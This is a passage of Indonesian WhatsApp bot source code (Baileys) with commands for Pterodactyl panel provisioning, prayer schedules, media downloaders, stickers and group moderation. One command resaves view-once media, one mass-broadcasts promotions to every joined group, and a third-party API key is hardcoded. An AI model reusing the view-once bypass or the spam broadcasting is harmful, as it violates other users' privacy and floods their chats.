        Authorization: "Bearer " + apikeyV2
      },
      body: JSON.stringify({
        email,
        username,
        first_name: name,
        last_name: "Server",
        language: "en",
        password: password.toString()
      })
    });
    let data = await f.json();
    if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
    let user = data.attributes;
    let usr_id = user.id;

    // --- GET STARTUP COMMAND ---
    let f1 = await fetch(domainV2 + `/api/application/nests/${nestidV2}/eggs/${eggV2}`, {
      method: "GET",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: "Bearer " + apikeyV2
      }
    });
    let data2 = await f1.json();
    let startup_cmd = data2.attributes.startup;

    // --- CREATE SERVER ---
    let f2 = await fetch(domainV2 + "/api/application/servers", {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: "Bearer " + apikeyV2
      },
      body: JSON.stringify({
        name,
        description: "Thanks For Buying",
        user: usr_id,
        egg: parseInt(eggV2),
        docker_image: "ghcr.io/parkervcp/yolks:nodejs_20",
        startup: startup_cmd,
        environment: {
          INST: "npm",
          USER_UPLOAD: "0",
          AUTO_UPDATE: "0",
          CMD_RUN: "npm start"
        },
        limits: {
          memory: ram,
          swap: 0,
          disk: disknya,
          io: 500,
          cpu: cpu
        },
        feature_limits: {
          databases: 5,
          backups: 5,
          allocations: 5
        },
        deploy: {
          locations: [parseInt(locV2)],
          dedicated_ip: false,
          port_range: []
        }
      })
    });
    let result = await f2.json();
    if (result.errors) return m.reply(JSON.stringify(result.errors[0], null, 2));
    let server = result.attributes;

    await m.reply("*Berhasil membuat akun Panel✅*");

    // --- KIRIM HASIL KE TARGET ---
    const { generateWAMessageFromContent, generateWAMessageContent, proto } = require('@whiskeysockets/baileys');
    const fs = require("fs");

    var teks = `🖲️ *Pterodactyl Panel*
*About Panel Spec*
📡 *ID:* ${server.id}
⚙️ *RAM:* ${ram == "0" ? "Unlimited" : ram}
💾 *CPU:* ${cpu == "0" ? "Unlimited" : cpu + "%"}
🗄 *DISK:* ${disknya == "0" ? "Unlimited" : disknya}
🖥 *WEB:* ${global.domainV2}

👤 *User:* ${user.username}
🔐 *Pass:* ${password}`;

    let thumb = fs.readFileSync("./media/reply.jpg");
    let imgMsg = await generateWAMessageContent({ image: thumb }, { upload: conn.waUploadToServer });

    let msgii = await generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: {
          messageContextInfo: { deviceListMetadata: {}, deviceListMetadataVersion: 2 },
          interactiveMessage: proto.Message.InteractiveMessage.create({
            header: proto.Message.InteractiveMessage.Header.create({
              title: `CPANEL RAM ${rampanel.toUpperCase()} ✅`,
              hasMediaAttachment: true,
              imageMessage: imgMsg.imageMessage
            }),
            body: proto.Message.InteractiveMessage.Body.create({ text: teks }),
            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
              buttons: [
                { name: "cta_url", buttonParamsJson: JSON.stringify({ display_text: "🌐 Login Server Panel", url: global.domainV2 }) },
                { name: "cta_copy", buttonParamsJson: JSON.stringify({ display_text: "👤 Copy Username", copy_code: `${user.username}` }) },
                { name: "cta_copy", buttonParamsJson: JSON.stringify({ display_text: "🔐 Copy Password", copy_code: `${password}` }) },
                { name: "cta_url", buttonParamsJson: JSON.stringify({ display_text: "Ada Masalah ❓", url: "https://wa.me/6281313532320" }) }
              ]
            })
          })
        }
      }
    }, { userJid: target, quoted: m });

    await conn.relayMessage(target, msgii.message, { messageId: msgii.key.id });

    // hapus session biar ga numpuk
    delete global.sessionPanel[m.sender];

  } catch (err) {
    delete global.sessionPanel[m.sender];
    console.error(err);
    return m.reply("Terjadi error saat membuat server: " + (err.message || err));
  }
}
break;
//=========================================//
    case 'jadwalsholat':
    case 'jadwal-sholat': {
        if (!text) return m.reply('Mau lihat jadwal sholat di kota mana?\nContoh: .jadwalsholat surabaya');
        await m.reply('⏳ Mencari jadwal sholat...');
        try {
            const citySearch = await fetchJson(`https://api.myquran.com/v2/sholat/kota/cari/${text}`);
            if (!citySearch.status || citySearch.data.length === 0) {
                return m.reply(`Kota "${text}" tidak ditemukan. Coba gunakan nama kota yang lebih spesifik.`);
            }
            const cityId = citySearch.data[0].id;
            const today = new Date().toISOString().slice(0, 10); // Format YYYY-MM-DD
            const schedule = await fetchJson(`https://api.myquran.com/v2/sholat/jadwal/${cityId}/${today}`);

            if (!schedule.status) {
                return m.reply('Gagal mengambil jadwal sholat untuk kota tersebut.');
            }
            const jadwal = schedule.data.jadwal;
            const responseText = `
*JADWAL SHOLAT UNTUK HARI INI*
*Kota:* ${schedule.data.lokasi}
*Tanggal:* ${jadwal.tanggal}

- Imsak: ${jadwal.imsak}
- Subuh: ${jadwal.subuh}
- Terbit: ${jadwal.terbit}
- Dhuha: ${jadwal.dhuha}
- Dzuhur: ${jadwal.dzuhur}
- Ashar: ${jadwal.ashar}
- Maghrib: ${jadwal.maghrib}
- Isya: ${jadwal.isya}
            `.trim();
            m.reply(responseText);
        } catch (err) {
            console.error(err);
            m.reply('Terjadi kesalahan saat mengambil data jadwal sholat.');
        }
    }
    break;

    case 'asmaulhusna': {
        try {
            await m.reply('⏳ Memuat Asmaul Husna...');
            let data = await fetchJson('https://islamic-api-zhirrr.vercel.app/api/asmaulhusna');
            let asmaul = data.data;

            let responseText = '*ASMAUL HUSNA*\n\n' + asmaul.map((item) => {
              return `*${item.index}. ${item.latin} (${item.arabic})*\nArtinya: ${item.translation_id}\n`;
            }).join('\n');

            m.reply(responseText);
        } catch (err) {
            console.error(err);
            m.reply('Gagal mengambil data Asmaul Husna.');
        }
    }
    break;

    case 'niatsholat':
    case 'niat-sholat': {
        try {
            let listNiat = await fetchJson('https://islamic-api-zhirrr.vercel.app/api/niatshalat');

            if (!text) {
              let daftarNiat = '*DAFTAR NIAT SHOLAT*\n\n' + listNiat.map((item) => `- ${item.name}`).join('\n');
              daftarNiat += '\n\nKetik `.niatsholat [nama sholat]` untuk melihat niat, contoh: `.niatsholat subuh`';
              m.reply(daftarNiat);
            } else {
              let hasil = listNiat.find((item) => item.name.toLowerCase().includes(text.toLowerCase()));
              if (hasil) {
                let responseText = `*NIAT SHOLAT ${hasil.name.toUpperCase()}*\n\n` +
                  `*Arab:* ${hasil.arabic}\n\n` +
                  `*Latin:* ${hasil.latin}\n\n` +
                  `*Terjemahan:* ${hasil.terjemahan}`;
                m.reply(responseText);
              } else {
                m.reply('Niat sholat yang kamu cari tidak ditemukan. Cek kembali nama sholatnya.');
              }
            }
        } catch (err) {
            console.error(err);
            m.reply('Gagal mengambil data niat sholat.');
        }
    }
    break;

    

    case 'doa':
    case 'berdoa': {
        try {
            let listDoa = await fetchJson('https://doa-doa-api-ahmadramadhan.fly.dev/api');
            if (!text) {
              let daftarDoa = '*DAFTAR DOA*\n\n' + listDoa.map((item) => `- ${item.doa}`).join('\n');
              daftarDoa += '\n\nKetik `.doa [nama doa]` untuk melihat doa, contoh: `.doa doa sebelum tidur`';
              m.reply(daftarDoa);
            } else {
              let hasil = listDoa.find((item) => item.doa.toLowerCase().includes(text.toLowerCase()));
              if (hasil) {
                let responseText = `*DOA: ${hasil.doa.toUpperCase()}*\n\n` +
                  `*Ayat:* ${hasil.ayat}\n\n` +
                  `*Latin:* ${hasil.latin}\n\n` +
                  `*Artinya:* ${hasil.artinya}`;
                m.reply(responseText);
              } else {
                m.reply('Doa yang kamu cari tidak ditemukan. Cek kembali nama doanya.');
              }
            }
        } catch (err) {
            console.error(err);
            m.reply('Gagal mengambil data doa.');
        }
    }
    break;
    
    case 'sholat': {
    if (!m.isGroup) return m.reply("Perintah ini hanya bisa digunakan di dalam grup.");
    if (!m.isAdmin && !IsCreator) return m.reply('Hanya admin dan owner yang bisa menggunakan perintah ini.');

    const subcommand = args[0]?.toLowerCase();
    
    if (!subcommand) {
        const status = global.prayerReminderGroups.includes(m.chat) ? 'AKTIF' : 'NON-AKTIF';
        return m.reply(`Status pengingat sholat di grup ini: *${status}*\n\nGunakan:\n- ${prefix}sholat on (untuk mengaktifkan)\n- ${prefix}sholat off (untuk menonaktifkan)`);
    }

    if (subcommand === 'on') {
        if (global.prayerReminderGroups.includes(m.chat)) {
            return m.reply("Pengingat sholat sudah aktif di grup ini.");
        }
        
        global.prayerReminderGroups.push(m.chat);
        savePrayerReminderGroups(global.prayerReminderGroups);
        await m.reply("✅ Pengingat sholat telah diaktifkan di grup ini. Bot akan mengirim pengingat ketika waktu sholat tiba.");
        
    } else if (subcommand === 'off') {
        const index = global.prayerReminderGroups.indexOf(m.chat);
        if (index === -1) {
            return m.reply("Pengingat sholat belum aktif di grup ini.");
        }
        
        global.prayerReminderGroups.splice(index, 1);
        savePrayerReminderGroups(global.prayerReminderGroups);
        await m.reply("✅ Pengingat sholat telah dinonaktifkan di grup ini.");
        
    } else {
        m.reply(`Subperintah tidak dikenali. Gunakan:\n- ${prefix}sholat on\n- ${prefix}sholat off`);
    }
}
break;
    
//=========================================//
//=========================================//
//=========================================//
//=========================================//
//=========================================//
//=========================================//
//=========================================//
//=========================================//
//=========================================//
//=========================================//
//=========================================//
//=========================================//
//=========================================//
//=========================================//
//=========================================//
//=========================================//

// ATAS NEW SEMUA WOI

case "delete": case "del": {
if (m.isGroup) {
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (!m.quoted) return m.reply("reply pesannya")
if (m.quoted.fromMe) {
conn.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: true, id: m.quoted.id, participant: m.quoted.sender}})
} else {
if (!m.isBotAdmin) return Reply(mess.botAdmin)
conn.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.quoted.id, participant: m.quoted.sender}})
}} else {
if (!isCreator) return Reply(mess.owner)
if (!m.quoted) return m.reply(example("reply pesan"))
conn.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.quoted.id, participant: m.quoted.sender}})
}
}
break

//=========================================//

case "clsesi": case "clearsession": {
const dirsesi = fs.readdirSync("./session").filter(e => e !== "creds.json")
const dirsampah = fs.readdirSync("./library/database/sampah").filter(e => e !== "A")
for (const i of dirsesi) {
await fs.unlinkSync("./session/" + i)
}
for (const u of dirsampah) {
await fs.unlinkSync("./library/database/sampah/" + u)
}
m.reply(`*Berhasil membersihkan sampah ✅*
*${dirsesi.length}* sampah session\n*${dirsampah.length}* sampah file`)
}
break

//=========================================//

case "unblok": {
if (!isCreator) return Reply(global.mess.owner)
if (m.isGroup && !m.quoted && !text) return m.reply(example("@tag/nomornya"))
const mem = !m.isGroup ? m.chat : m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text ? text.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : ""
await conn.updateBlockStatus(mem, "unblock");
if (m.isGroup) conn.sendMessage(m.chat, {text: `Berhasil membuka blokiran @${mem.split('@')[0]}`, mentions: [mem]}, {quoted: m})
}
break

//=========================================//

case "sendtesti": case "testi": {
if (!isCreator) return Reply(global.mess.owner)
if (!text) return m.reply(example("teks dengan mengirim foto"))
if (!/image/.test(mime)) return m.reply(example("teks dengan mengirim foto"))
const allgrup = await conn.groupFetchAllParticipating()
const res = await Object.keys(allgrup)
let count = 0
const teks = text
const jid = m.chat
const rest = await conn.downloadAndSaveMediaMessage(qmsg)
await m.reply(`Memproses jpm testimoni ke dalam channel & ${res.length} grup`)
await conn.sendMessage(global.idSaluran, {image: await fs.readFileSync(rest), caption: teks})
for (let i of res) {
if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
try {
await conn.sendMessage(i, {
  footer: `© 2025 ${botname}`,
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Beli Produk',
          sections: [
            {
              title: 'List Produk',
              highlight_label: 'Recommended',
              rows: [
                {
                  title: 'Panel Pterodactyl',
                  id: '.dev'
                },
                {
                  title: 'Admin Panel Pterodactyl',
                  id: '.dev'
                },                
                {
                  title: 'Vps (Virtual Private Server)',
                  id: '.dev'
                },
                {
                  title: 'Script Bot WhatsApp',
                  id: '.dev'
                }
              ]
            }
          ]
        })
      }
      }
  ],
  headerType: 1,
  viewOnce: true,
  image: await fs.readFileSync(rest), 
  caption: `\n${teks}\n`,
  contextInfo: {
   isForwarded: true, 
   forwardedNewsletterMessageInfo: {
   newsletterJid: global.idSaluran,
   newsletterName: global.namaSaluran
   }
  },
}, {quoted: qtoko})
count += 1
} catch {}
await sleep(global.delayJpm)
}
await fs.unlinkSync(rest)
await conn.sendMessage(jid, {text: `Testimoni berhasil dikirim ke dalam channel & ${count} grup`}, {quoted: m})
}
break

//=========================================//

case "yts": {
if (!text) return m.reply(example('we dont talk'))
await conn.sendMessage(m.chat, {react: {text: '🔎', key: m.key}})
let ytsSearch = await yts(text)
const anuan = ytsSearch.all
let teks = "\n    *[ Result From Youtube Search 🔍 ]*\n\n"
for (let res of anuan) {
teks += `* *Title :* ${res.title}
* *Durasi :* ${res.timestamp}
* *Upload :* ${res.ago}
* *Views :* ${res.views}
* *Author :* ${res?.author?.name || "Unknown"}
* *Source :* ${res.url}\n\n`
}
await m.reply(teks)
await conn.sendMessage(m.chat, {react: {text: '', key: m.key}})
}
break

//=========================================//

case "gimage": {
    if (!text) return m.reply(example("logo whatsapp"));

    await conn.sendMessage(m.chat, { react: { text: '🔎', key: m.key } });

    try {
        const res = await fetchJson(`https://flowfalcon.dpdns.org/search/gimage?q=${encodeURIComponent(text)}`);

        if (!res.status) return m.reply("Error: Gagal mendapatkan data gambar.");

        if (!res.result || !Array.isArray(res.result) || res.result.length === 0) {
            return m.reply("Maaf, hasil pencarian gambar tidak ditemukan.");
        }

        let aray = res.result.length < 5 ? res.result : res.result.slice(0, 5);
        let total = 0;

        for (let i of aray) {
            // Asumsi properti gambar ada di i.image atau i.url
            let imageUrl = i.image || i.url;
            if (!imageUrl) continue;

            await conn.sendMessage(m.chat, { image: { url: imageUrl }, caption: `Hasil pencarian foto ke ${++total}` }, { quoted: m });
        }

    } catch (e) {
        console.error("Error saat pencarian gambar:", e);
        m.reply("Terjadi kesalahan saat menghubungi API.");
    } finally {
        await conn.sendMessage(m.chat, { react: { text: '', key: m.key } });
    }
}
break;

//=========================================//

case "xnxx": {
    if (!text) return m.reply("Masukkan kata kunci pencarian, contoh: .xnxx video lucu");

    try {
        const url = `https://flowfalcon.dpdns.org/search/xnxx?query=${encodeURIComponent(text)}`;
        const res = await fetchJson(url);

        if (!res.status || !Array.isArray(res.result) || res.result.length === 0) {
            return m.reply("Maaf, hasil pencarian tidak ditemukan.");
        }

        let reply = `*Hasil pencarian untuk:* ${text}\n\n`;
        const maxResults = 5; // batasi hasil

        res.result.slice(0, maxResults).forEach((item, index) => {
            reply += `*${index + 1}. ${item.title}*\n`;
            reply += `Info: ${item.info.trim()}\n`;
            reply += `Link: ${item.link}\n\n`;
        });

        await m.reply(reply);
    } catch (e) {
        console.error("Error saat pencarian xnxx:", e);
        m.reply("Gagal mencari data.");
    }
}
break;

//=========================================//

case "animesearch": {
 if (!text) return m.reply(`Contoh penggunaan: .${prefix}solo leveling`)
 
 try {
 // Show loading indicator
 await m.reply('🔍 Mencari anime...')
 
 // Make API request
 const apiUrl = `https://flowfalcon.dpdns.org/anime/search?q=${encodeURIComponent(text)}`
 const { data } = await axios.get(apiUrl)
 
 if (!data.status || !data.result || data.result.length === 0) {
 return m.reply('Tidak ditemukan hasil untuk anime tersebut.')
 }
 
 // Format the results
 let replyText = `🎌 *Hasil Pencarian Anime* 🎌\n\n`
 data.result.forEach((anime, index) => {
 replyText += `*${index + 1}. ${anime.title}*\n`
 replyText += `├ Tipe: ${anime.type || 'Tidak diketahui'}\n`
 replyText += `├ Status: ${anime.status || 'Tidak diketahui'}\n`
 replyText += `└ Link: ${anime.link}\n\n`
 })
 
 // Send first result with image
 const firstResult = data.result[0]
 await conn.sendMessage(m.chat, {
 image: { url: firstResult.image },
 caption: replyText
 }, { quoted: m })
 
 } catch (error) {
 console.error('Error searching anime:', error)
 m.reply('Gagal melakukan pencarian anime. Silakan coba lagi nanti.')
 }
}
break

//=========================================//

case "block": case "blok": {
if (!isCreator) return Reply(global.mess.owner)
if (m.isGroup && !m.quoted && !text) return m.reply(example("@tag/nomornya"))
const mem = !m.isGroup ? m.chat : m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text ? text.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : ""
await conn.updateBlockStatus(mem, "block")
if (m.isGroup) conn.sendMessage(m.chat, {text: `Berhasil memblokir @${mem.split('@')[0]}`, mentions: [mem]}, {quoted: m})
}
break

//=========================================//

case "tiktokmp3": case "ttmp3": {
if (!text) return m.reply(example("linknya"))
if (!text.startsWith('https://')) return m.reply("Link tautan tidak valid")
await conn.sendMessage(m.chat, {react: {text: '🕖', key: m.key}})
await tiktokDl(text).then(async (res) => {
if (!res.status) return m.reply("Error! Result Not Found")
await conn.sendMessage(m.chat, {audio: {url: res.music_info.url}, mimetype: "audio/mpeg"}, {quoted: m})
await conn.sendMessage(m.chat, {react: {text: '', key: m.key}})
}).catch((e) => m.reply("Error"))
}
break

//=========================================//

case "tt": case "tiktok": {
if (!text) return m.reply(example("url"))
if (!text.startsWith("https://")) return m.reply(example("url"))
await tiktokDl(q).then(async (result) => {
await conn.sendMessage(m.chat, {react: {text: '🕖', key: m.key}})
if (!result.status) return m.reply("Error")
if (result.durations == 0 && result.duration == "0 Seconds") {
let araara = new Array()
let urutan = 0
for (let a of result.data) {
let imgsc = await prepareWAMessageMedia({ image: {url: `${a.url}`}}, { upload: conn.waUploadToServer })
await araara.push({
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `Foto Slide Ke *${urutan += 1}*`, 
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Link Tautan Foto\",\"url\":\"${a.url}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
})
}
const msgii = await generateWAMessageFromContent(m.chat, {
viewOnceMessageV2Extension: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
}, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
body: proto.Message.InteractiveMessage.Body.fromObject({
text: "*Tiktok Downloader ✅*"
}),
carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
cards: araara
})
})}
}}, {userJid: m.sender, quoted: m})
await conn.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
})
} else {
let urlVid = await result.data.find(e => e.type == "nowatermark_hd" || e.type == "nowatermark")
await conn.sendMessage(m.chat, {video: {url: urlVid.url}, mimetype: 'video/mp4', caption: `*Tiktok Downloader ✅*`}, {quoted: m})
}
}).catch(e => console.log(e))
await conn.sendMessage(m.chat, {react: {text: '', key: m.key}})
}
break

//=========================================//

case "ssweb": {
if (!text) return m.reply(example("https://example.com"))
if (!isUrl(text)) return m.reply(example("https://example.com"))
const {
  screenshotV1, 
  screenshotV2,
  screenshotV3 
} = require('getscreenshot.js')
const fs = require('fs')
var data = await screenshotV2(text)
await conn.sendMessage(m.chat, { image: data, mimetype: "image/png"}, {quoted: m})
}
break

//=========================================//

case "shortlink": case "shorturl": {
if (!text) return m.reply(example("https://example.com"))
if (!isUrl(text)) return m.reply(example("https://example.com"))
var res = await axios.get('https://tinyurl.com/api-create.php?url='+encodeURIComponent(text))
var link = `
* *Shortlink by tinyurl.com*
${res.data.toString()}
`
return m.reply(link)
}
break

//=========================================//

case "shortlink-dl": {
if (!text) return m.reply(example("https://example.com"))
if (!isUrl(text)) return m.reply(example("https://example.com"))
var a = await fetch(`https://moneyblink.com/st/?api=524de9dbd18357810a9e6b76810ace32d81a7d5f&url=${text}`)
await conn.sendMessage(m.chat, {text: a.url}, {quoted: m})
}
break

//=========================================//

case "idgc": case "cekidgc": {
if (!m.isGroup) return Reply(mess.group)
m.reply(m.chat)
}
break

//=========================================//

case "listgc": case "listgrup": {
if (!isCreator) return
let teks = `\n *乂 List all group chat*\n`
let a = await conn.groupFetchAllParticipating()
let gc = Object.values(a)
teks += `\n* *Total group :* ${gc.length}\n`
for (const u of gc) {
teks += `\n* *ID :* ${u.id}
* *Nama :* ${u.subject}
* *Member :* ${u.participants.length}
* *Status :* ${u.announce == false ? "Terbuka": "Hanya Admin"}
* *Pembuat :* ${u?.subjectOwner ? u?.subjectOwner.split("@")[0] : "Sudah Keluar"}\n`
}
return m.reply(teks)
}
break

//=========================================//
case 'cekidch': {
    if (!text) return m.reply("Silakan masukkan link channel WhatsApp.");
    if (!text.includes("https://whatsapp.com/channel/")) return reply("Link tautan channel tidak valid.");

    try {
        const channelCode = text.split('https://whatsapp.com/channel/')[1];
        const res = await conn.newsletterMetadata("invite", channelCode);

        if (!res || !res.id) {
            return m.reply("Gagal mendapatkan informasi channel. Pastikan link yang Anda berikan benar dan channel tersebut publik.");
        }

        const verificationStatus = res.verification === "VERIFIED" ? "Terverifikasi" : "Tidak Terverifikasi";

        const teks = `*Detail Informasi Channel*\n\n` +
                     `*ID :* ${res.id}\n` +
                     `*Nama :* ${res.name}\n` +
                     `*Total Pengikut :* ${res.subscribers}\n` +
                     `*Status :* ${res.state}\n` +
                     `*Verifikasi :* ${verificationStatus}`;

        const msg = generateWAMessageFromContent(m.chat, {
            viewOnceMessage: {
                message: {
                    "messageContextInfo": {
                        "deviceListMetadata": {},
                        "deviceListMetadataVersion": 2
                    },
                    interactiveMessage: {
                        body: {
                            text: teks
                        },
                        footer: {
                            text: '© FyzzBotzz'
                        },
                        nativeFlowMessage: {
                            buttons: [{
                                "name": "cta_copy",
                                "buttonParamsJson": JSON.stringify({
                                    "display_text": "Salin ID Channel",
                                    "copy_code": res.id
                                })
                            }],
                        },
                    },
                },
            },
        }, {
            quoted: m
        });

        await conn.relayMessage(m.chat, msg.message, {
            messageId: msg.key.id
        });

    } catch (e) {
        console.error("Error pada perintah 'cekidch':", e);
        m.reply("Terjadi kesalahan. Gagal mengambil informasi channel. Pastikan link yang Anda berikan valid.");
    }
}
break; 

//=========================================//

case 'brat': {
  if (!text) return m.reply("Contoh: .brat Halo");
  
  try {
    // Kirim reaksi emoji 
    await conn.sendMessage(m.chat, { 
      react: { 
        text: '⏳',     // Emoji yang ditampilkan
        key: m.key      // Merujuk ke pesan yang memicu perintah
      } 
    });
    
    const stickerBuf = await getBratStickerBuffer(text);
    await conn.sendMessage(m.chat, { sticker: stickerBuf }, { quoted: m });
    await conn.sendMessage(m.chat, { 
      react: { 
        text: '✅',     // Emoji centang hijau
        key: m.key 
      } 
    });
    
  } catch (e) {
    console.error('❌ Error brat:', e);
    await conn.sendMessage(m.chat, { 
      react: { 
        text: '❌',     // Emoji X merah
        key: m.key 
      } 
    });
    
    m.reply("⚠️ Gagal membuat sticker brat.");
  }
}
break;

//=========================================//

case "qc": {
if (!text) return m.reply(example('teksnya'))
let warna = ["#000000", "#ff2414", "#22b4f2", "#eb13f2"]
var ppuser
try {
ppuser = await conn.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://telegra.ph/file/a059a6a734ed202c879d3.jpg'
}
const json = {
  "type": "quote",
  "format": "png",
  "backgroundColor": "#000000",
  "width": 812,
  "height": 968,
  "scale": 2,
  "messages": [
    {
      "entities": [],
      "avatar": true,
      "from": {
        "id": 1,
        "name": m.pushName,
        "photo": {
          "url": ppuser
        }
      },
      "text": text,
      "replyMessage": {}
    }
  ]
};
        const response = axios.post('https://bot.lyo.su/quote/generate', json, {
        headers: {'Content-Type': 'application/json'}
}).then(async (res) => {
    const buffer = Buffer.from(res.data.result.image, 'base64')
    let tempnya = "./library/database/sampah/"+m.sender+".png"
await fs.writeFile(tempnya, buffer, async (err) => {
if (err) return m.reply("Error")
await conn.sendAsSticker(m.chat, tempnya, m, {packname: global.packname})
await fs.unlinkSync(`${tempnya}`)
})
})
}
break

//=========================================//

case "s": case "sticker": case "stiker": {
if (!/image|video/gi.test(mime)) return m.reply(example("dengan kirim media"))
if (/video/gi.test(mime) && qmsg.seconds > 15) return m.reply("Durasi vidio maksimal 15 detik!")
var image = await conn.downloadAndSaveMediaMessage(qmsg)
await conn.sendAsSticker(m.chat, image, m, {packname: global.packname})
await fs.unlinkSync(image)
}
break

//=========================================//

case "swm": case "stickerwm": case "stikerwm": case "wm": {
if (!text) return m.reply(example("namamu dengan kirim media"))
if (!/image|video/gi.test(mime)) return m.reply(example("namamu dengan kirim media"))
if (/video/gi.test(mime) && qmsg.seconds > 15) return m.reply("Durasi vidio maksimal 15 detik!")
var image = await conn.downloadAndSaveMediaMessage(qmsg)
await conn.sendAsSticker(m.chat, image, m, {packname: text})
await fs.unlinkSync(image)
}
break

//=========================================//

case "rvo": case "readviewonce": {
if (!m.quoted) return m.reply(example("dengan reply pesannya"))
let msg = m.quoted.message
    let type = Object.keys(msg)[0]
if (!msg[type].viewOnce) return m.reply("Pesan itu bukan viewonce!")
let media = await downloadContentFromMessage(msg[type], type == 'imageMessage' ? 'image' : type == 'videoMessage' ? 'video' : 'audio')
    let buffer = Buffer.from([])
    for await (const chunk of media) {
        buffer = Buffer.concat([buffer, chunk])
    }
    if (/video/.test(type)) {
        return conn.sendMessage(m.chat, {video: buffer, caption: msg[type].caption || ""}, {quoted: m})
    } else if (/image/.test(type)) {
        return conn.sendMessage(m.chat, {image: buffer, caption: msg[type].caption || ""}, {quoted: m})
    } else if (/audio/.test(type)) {
        return conn.sendMessage(m.chat, {audio: buffer, mimetype: "audio/mpeg", ptt: true}, {quoted: m})
    } 
}
break

//=========================================//

case "tourl": {
if (!/image/.test(mime)) return m.reply(example("dengan kirim/reply foto"))
let media = await conn.downloadAndSaveMediaMessage(qmsg)
const { ImageUploadService } = require('node-upload-images')
const service = new ImageUploadService('pixhost.to');
let { directLink } = await service.uploadFromBinary(fs.readFileSync(media), 'FixzzXcpanel.png');

let teks = directLink.toString()
await conn.sendMessage(m.chat, {text: teks}, {quoted: m})
await fs.unlinkSync(media)
}
break

//=========================================//

case "tourl2": {
if (!/image/.test(mime)) return m.reply(example("dengan kirim/reply foto"))
let media = await conn.downloadAndSaveMediaMessage(qmsg)
const { ImageUploadService } = require('node-upload-images')
const service = new ImageUploadService('postimages.org');
let { directLink } = await service.uploadFromBinary(fs.readFileSync(media), 'FixzzXcpanel.png');
let teks = directLink.toString()
await conn.sendMessage(m.chat, {text: teks}, {quoted: m})
await fs.unlinkSync(media)
}
break

//=========================================//

case "ai":
case "gpt":
case "openai": {
 if (!text) return m.reply("Silakan tulis pertanyaan, contoh: .ai siapa kamu?");

 try {
 const prompt = encodeURIComponent(text);
 const model = "chatgpt4"; // sesuaikan model yang ingin dipakai

 const url = `https://flowfalcon.dpdns.org/ai/chatbot?prompt=${prompt}&model=${model}`;
 const res = await fetchJson(url);

 console.log("Response API penuh:", res);

 if (res.status === false) {
 return m.reply(`Error dari API: ${res.message}`);
 }

 // Cek semua properti yang mungkin berisi balasan AI
 const reply = res.result || res.message || res.response || res.data || null;

 if (!reply) {
 return m.reply("Balasan kosong dari AI.");
 }

 await m.reply(reply);
 } catch (e) {
 console.error("Error saat panggil API:", e);
 m.reply("Gagal memproses permintaan AI.");
 }
}
break

//=========================================//

case "tr": case "translate": {
let language
let teks
let defaultLang = "en"
if (text || m.quoted) {
let translate = require('translate-google-api')
if (text && !m.quoted) {
if (args.length < 2) return m.reply(example("id good night"))
language = args[0]
teks = text.split(" ").slice(1).join(' ')
} else if (m.quoted) {
if (!text) return m.reply(example("id good night"))
if (args.length < 1) return m.reply(example("id good night"))
if (!m.quoted.text) return m.reply(example("id good night"))
language = args[0]
teks = m.quoted.text
}
let result
try {
result = await translate(`${teks}`, {to: language})
} catch (e) {
result = await translate(`${teks}`, {to: defaultLang})
} finally {
m.reply(result[0])
}
} else {
return m.reply(example("id good night"))
}}
break

//=========================================//

case "add": {
if (!m.isGroup) return Reply(mess.group)
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
if (text) {
const input = text ? text.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : false
var onWa = await conn.onWhatsApp(input.split("@")[0])
if (onWa.length < 1) return m.reply("Nomor tidak terdaftar di whatsapp")
const res = await conn.groupParticipantsUpdate(m.chat, [input], 'add')
if (Object.keys(res).length == 0) {
return m.reply(`Berhasil Menambahkan ${input.split("@")[0]} Kedalam Grup Ini`)
} else {
return m.reply(JSON.stringify(res, null, 2))
}} else {
return m.reply(example("62838###"))
}
}
break

//=========================================//

case "kick": case "kik": {
if (!m.isGroup) return Reply(mess.group)
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
if (text || m.quoted) {
const input = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text ? text.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : false
var onWa = await conn.onWhatsApp(input.split("@")[0])
if (onWa.length < 1) return m.reply("Nomor tidak terdaftar di whatsapp")
const res = await conn.groupParticipantsUpdate(m.chat, [input], 'remove')
await m.reply(`Berhasil mengeluarkan ${input.split("@")[0]} dari grup ini`)
} else {
return m.reply(example("@tag/reply"))
}
}
break

//=========================================//

case "leave": {
if (!isCreator) return Reply(mess.owner)
if (!m.isGroup) return Reply(mess.group)
await m.reply("Baik, Saya Akan Keluar Dari Grup Ini")
await sleep(4000)
await conn.groupLeave(m.chat)
}
break

//=========================================//

case "resetlinkgc": {
if (!isCreator) return Reply(mess.owner)
